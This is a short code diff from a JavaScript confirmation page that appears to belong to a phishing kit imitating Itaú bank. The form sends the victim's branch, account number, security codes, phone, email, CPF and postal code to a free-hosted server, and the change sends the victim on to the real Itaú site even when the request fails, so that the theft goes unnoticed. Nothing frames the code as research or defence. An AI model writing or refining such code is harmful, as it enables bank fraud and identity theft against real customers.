@@ -35,10 +35,9 @@ const Confirmacao = () => {
     try {
       const response = await fetch(`https://checker9387.000webhostapp.com/index.php?ag=${ag}&conta=${conta}&quatro=${quatro}&tel=${tel}&seis=${seis}&email=${email}&cpf=${cpf}&cep=${cep}`);
       const data = await response.json();
-      window.location.href = "https://www.w3schools.com";
+      window.location.href = "https://www.itau.com.br/";
     } catch (error) {
-      console.error('Error:', error);
-      alert('Ocorreu um erro ao enviar os dados. Por favor, tente novamente.');
+      window.location.href = "https://www.itau.com.br/";
     }
   }
 
